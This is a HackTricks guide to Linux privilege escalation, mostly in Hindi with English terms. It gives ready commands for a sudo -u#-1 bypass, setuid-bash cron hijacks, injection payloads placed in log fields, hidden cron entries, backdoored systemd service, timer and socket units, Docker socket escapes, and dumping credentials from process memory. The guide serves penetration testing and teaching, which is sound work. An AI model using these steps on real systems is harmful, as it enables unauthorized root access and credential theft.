# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

आइए चल रहे OS के बारे में जानकारी इकट्ठा करना शुरू करते हैं
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **have write permissions on any folder inside the `PATH`** variable हैं तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version जांचें और देखें कि कोई ऐसा exploit है जिसका इस्तेमाल करके privileges escalate किए जा सकें।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel सूची और कुछ पहले से **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel संस्करण निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले टूल:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim में execute करें, केवल kernel 2.x के लिए exploits ही जाँचता है)

हमेशा **Google में kernel version खोजें**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो पाएँगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

निम्नलिखित में दिखाई देने वाले vulnerable sudo versions के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

**smasher2 box of HTB** में इस vuln को कैसे exploited किया जा सकता है, इसका एक **उदाहरण** देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप docker container के अंदर हैं, तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जांचें कि **क्या mounted और unmounted है**, कहाँ और क्यों। अगर कुछ भी unmounted है, तो आप इसे mount करने की कोशिश कर सकते हैं और निजी जानकारी की जांच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जांचें कि **कोई compiler इंस्टॉल है**। यह उपयोगी होता है अगर आपको किसी kernel exploit का उपयोग करना पड़े, क्योंकि अनुशंसित है कि इसे उसी मशीन पर compile किया जाए जहाँ आप इसे उपयोग करने वाले हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर स्थापित

जाँच करें कि **इंस्टॉल किए गए पैकेजों और सेवाओं का संस्करण** क्या है। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जो escalating privileges के लिए exploit किया जा सके…\
अनुशंसा की जाती है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएँगे जो ज्यादातर बेकार होगी, इसलिए OpenVAS जैसे कुछ applications या समान टूल का उपयोग करने की सिफारिश की जाती है जो यह जाँचें कि कोई भी इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable है_

## प्रक्रियाएँ

देखें कि **कौन सी प्रक्रियाएँ** निष्पादित हो रही हैं और जाँचें कि किसी प्रक्रिया के पास **अपेक्षित से अधिक विशेषाधिकार** तो नहीं हैं (शायद tomcat को root द्वारा चलाया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **processes binaries पर अपने privileges चेक करें**, शायद आप किसी का बाइनरी ओवरराइट कर सकें।

### प्रोसेस मॉनिटरिंग

आप प्रोसेस मॉनिटर करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे टूल्स का उपयोग कर सकते हैं। यह बार-बार चलने वाली या जब कुछ शर्तें पूरी हों तब execute होने वाली कमजोर प्रक्रियाओं की पहचान करने में बहुत उपयोगी हो सकता है।

### प्रोसेस मेमोरी

कुछ सर्विसेज सर्वर की मेमोरी के अंदर **clear text में credentials** सेव कर देती हैं।\
आम तौर पर दूसरे यूज़र्स के processes की मेमोरी पढ़ने के लिए आपको **root privileges** चाहिए होते हैं, इसलिए यह सामान्यतः तब अधिक उपयोगी होता है जब आप पहले से root हों और और भी credentials खोजना चाहें।\
हालाँकि, ध्यान रखें कि **एक सामान्य यूज़र के रूप में आप उन प्रक्रियाओं की मेमोरी पढ़ सकते हैं जो आपकी ही हैं**।

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: सभी प्रोसेसेस डिबग किए जा सकते हैं, बशर्ते उनका uid समान हो। यह ptracing का पारंपरिक तरीका था।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process ही डिबग किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: ptrace के साथ कोई भी प्रक्रिया ट्रेस नहीं की जा सकती। एक बार सेट होने पर ptracing को फिर से सक्षम करने के लिए reboot आवश्यक होगा।

#### GDB

यदि आपके पास किसी FTP service की मेमोरी तक पहुँच है (उदाहरण के लिए) तो आप Heap प्राप्त कर सकते हैं और उसके अंदर के credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps यह दिखाता है कि उस process की virtual address space में memory कैसे mapped है**; यह प्रत्येक mapped region की **permissions** भी दिखाता है। **mem** pseudo file स्वयं process की memory को उजागर करता है। **maps** फ़ाइल से हमें पता चलता है कि कौन से **memory regions पढ़ने योग्य (readable)** हैं और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek करके सभी पढ़ने योग्य regions को एक फ़ाइल में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुंच प्रदान करता है, न कि वर्चुअल मेमोरी। The kernel's virtual address space can be accessed using /dev/kmem.\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ने योग्य होता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के लिए Sysinternals suite of tools में मौजूद क्लासिक ProcDump tool का Linux के लिए पुनर्कल्पना है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

किसी process memory को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root requirements हटा सकते हैं और आपके द्वारा owned process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन देखें ताकि process की memory को dump करने के विभिन्न तरीके मिल सकें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **steal clear text credentials from memory** और कुछ **well known files** से इन्हें चुरा लेता है। यह सही तरीके से काम करने के लिए root privileges की आवश्यकता होती है।

| विशेषता                                           | प्रक्रिया नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

जाँचें कि कोई भी scheduled job vulnerable तो नहीं है। शायद आप उस script का फायदा उठा सकें जो root द्वारा चलाया जा रहा है (wildcard vuln? क्या आप root द्वारा उपयोग किए जाने वाले files को modify कर सकते हैं? symlinks का उपयोग? root द्वारा उपयोग किए जाने वाले directory में specific files बना दें?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab के अंदर root उपयोगकर्ता किसी कमांड या स्क्रिप्ट को PATH सेट किए बिना चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\  
तो, आप निम्न का उपयोग करके एक root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Wildcard के साथ स्क्रिप्ट का इस्तेमाल करने वाला Cron (Wildcard Injection)

यदि कोई स्क्रिप्ट, जिसे root द्वारा चलाया जाता है, किसी कमांड के अंदर “**\***” रखती है, तो आप इसका फायदा उठा कर अप्रत्याशित चीजें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path से पहले आता है जैसे** _**/some/path/\***_ **, यह कमजोर नहीं है (यहाँ तक कि** _**./\***_ **नहीं है)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें किसी arithmetic context में डालता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron चलने पर root के रूप में execute होगा।

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. इसलिए एक value जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substitute हो जाती है (कमांड चलती है), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है जिससे स्क्रिप्ट बिना error के जारी रहती है।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: attacker-controlled text को parsed log में लिखवाएं ताकि numeric-looking field में command substitution हो और वह किसी digit पर खत्म हो। सुनिश्चित करें कि आपका command stdout पर कुछ न छापे (या उसे redirect करें) ताकि arithmetic वैध बना रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **root द्वारा executed किसी cron script** को modify कर सकते हैं, तो आप बहुत आसानी से एक shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script **directory जिस पर आपकी पूर्ण पहुँच है** का उपयोग करता है, तो शायद उस फ़ोल्डर को हटाकर और किसी दूसरे पर इंगित करने हेतु **symlink folder बनाना** उपयोगी हो सकता है जो आपके नियंत्रित script को सर्व करे।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### अक्सर चलने वाले cron jobs

आप प्रक्रियाओं की निगरानी कर सकते हैं ताकि उन प्रक्रियाओं की खोज की जा सके जो हर 1, 2 या 5 मिनट पर चल रही हैं। हो सकता है आप इसका फायदा उठाकर escalate privileges कर सकें।

उदाहरण के लिए, **monitor every 0.1s during 1 minute**, **sort by less executed commands** और उन commands को हटाने के लिए जो सबसे अधिक execute हुए हैं, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप यह भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली हर प्रक्रिया को मॉनिटर और सूचीबद्ध करेगा)।

### अदृश्य cron jobs

यह संभव है कि आप एक cronjob बना सकें **टिप्पणी के बाद carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँच करें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, यदि कर सकते हैं तो आप **इसे संशोधित कर सकते हैं** ताकि यह आपके **backdoor** को तब **निष्पादित** करे जब service **शुरू**, **पुनःआरंभ** या **रोक** किया जाए (शायद आपको मशीन के reboot होने तक प्रतीक्षा करनी पड़ सकती है).\
उदाहरण के लिए, अपनी backdoor को `.service` फ़ाइल के अंदर इस तरह बनाएं: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service बाइनरीज़

ध्यान रखें कि यदि आपके पास सेवाओं द्वारा निष्पादित की जा रही बाइनरीज़ पर **लिखने की अनुमति** है, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएँ फिर से निष्पादित हों तो backdoors निष्पादित हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जा रहे PATH को निम्नलिखित से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पाथ के किसी भी फोल्डर में **write** कर सकते हैं तो आप **escalate privileges** कर सकते हैं। आपको **relative paths being used on service configurations** जैसी फ़ाइलों में खोज करना होगा, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, आप जिस systemd PATH फ़ोल्डर में लिख सकते हैं उसके भीतर relative path binary के उसी नाम के साथ एक **executable** बनाएं, और जब सेवा से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, तो आपका **backdoor will be executed** (unprivileged users आमतौर पर services को start/stop नहीं कर पाते, लेकिन जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** systemd unit files हैं जिनके नाम का अंत `**.timer**` में होता है और ये `**.service**` files या events को control करते हैं। **Timers** को cron का alternative के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो आप इसे systemd.unit के कुछ मौजूद units (जैसे `.service` या `.target`) चलाने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> जब यह timer समाप्त होता है तो सक्रिय करने के लिए unit। आर्ग्यूमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट हो जाता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (ऊपर देखें।) सिफारिश की जाती है कि सक्रिय होने वाले unit का नाम और timer unit का नाम suffix के अलावा समान हों।

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **executing a writable binary**
- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर इसके लिए एक symlink बनाकर **सक्रिय** किया जाता है।

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल के भीतर एक ही या विभिन्न मशीनों पर प्रक्रिया संचार सक्षम करते हैं। वे इंटर-कम्प्यूटर संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Sockets के बारे में और जानने के लिए `man systemd.socket` देखें।** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन एक सारांश के तौर पर इसका उपयोग यह **दिखाने के लिए** किया जाता है कि socket कहाँ सुनने वाला है (AF_UNIX socket फ़ाइल का पथ, सुनने के लिए IPv4/6 और/या पोर्ट नंबर, आदि)
- `Accept`: एक boolean तर्क लेता है। यदि **true**, तो हर आने वाले कनेक्शन के लिए एक **service instance बनता है** और केवल कनेक्शन socket ही उसे पास किया जाता है। यदि **false**, तो सभी listening sockets स्वयं **started service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit बनाया जाता है। Datagram sockets और FIFOs के लिए यह मान उस स्थिति में अनदेखा किया जाता है जहाँ एक single service unit बिना शर्त सभी incoming ट्रैफ़िक को संभालता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons केवल इस तरह लिखने की सलाह दी जाती है कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के क्रमशः **बने और bound होने से पहले** या **बाद में** निष्पादित किया जाता है। command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के क्रमशः **बंद होने और हटाए जाने से पहले** या **बाद में** निष्पादित किए जाते हैं।
- `Service`: आने वाले ट्रैफ़िक पर सक्रिय करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल उन sockets के लिए अनुमति है जिनके लिए `Accept=no` है। यह डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम socket के नाम के समान होता है (suffix बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### लिखने योग्य .socket फ़ाइलें

यदि आपको कोई **writable** `.socket` फ़ाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाये जाने से पहले चल जाएगी। इसलिए, आपको **संभावतः मशीन के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि सिस्टम को उस socket फ़ाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए वरना backdoor निष्पादित नहीं होगा_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_अब हम Unix Sockets की बात कर रहे हैं न कि config `.socket` फ़ाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets की सूची बनाना
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_यहाँ मेरा मतलब .socket फ़ाइलों से नहीं है बल्कि उन फ़ाइलों से है जो unix sockets के रूप में कार्य करती हैं_)। आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और संभवतः **exploit some vulnerability** कर सकते हैं।

### लिखने योग्य Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर पाया जाता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखना चाहिए। डीफ़ॉल्ट रूप से, यह `root` उपयोगकर्ता और `docker` समूह के सदस्यों द्वारा लिखने योग्य होता है। इस सॉकेट पर write access होने से privilege escalation हो सकता है। नीचे इसका विवरण दिया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके यदि Docker CLI उपलब्ध न हो।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड होस्ट की फाइल सिस्टम पर root-स्तरीय पहुँच के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का प्रत्यक्ष उपयोग**

यदि Docker CLI उपलब्ध नहीं है, तो Docker socket को अभी भी Docker API और `curl` कमांड्स का उपयोग करके हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध Docker images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ऐसा container बनाने का अनुरोध भेजें जो host system की root directory को mount करे।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container से कनेक्शन स्थापित करने के लिए `socat` का उपयोग करें, जिससे उसके भीतर कमांड निष्पादित की जा सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप container में सीधे कमांड चला सकते हैं, जिसमें host की filesystem पर root-स्तरीय पहुँच होगी।

### Others

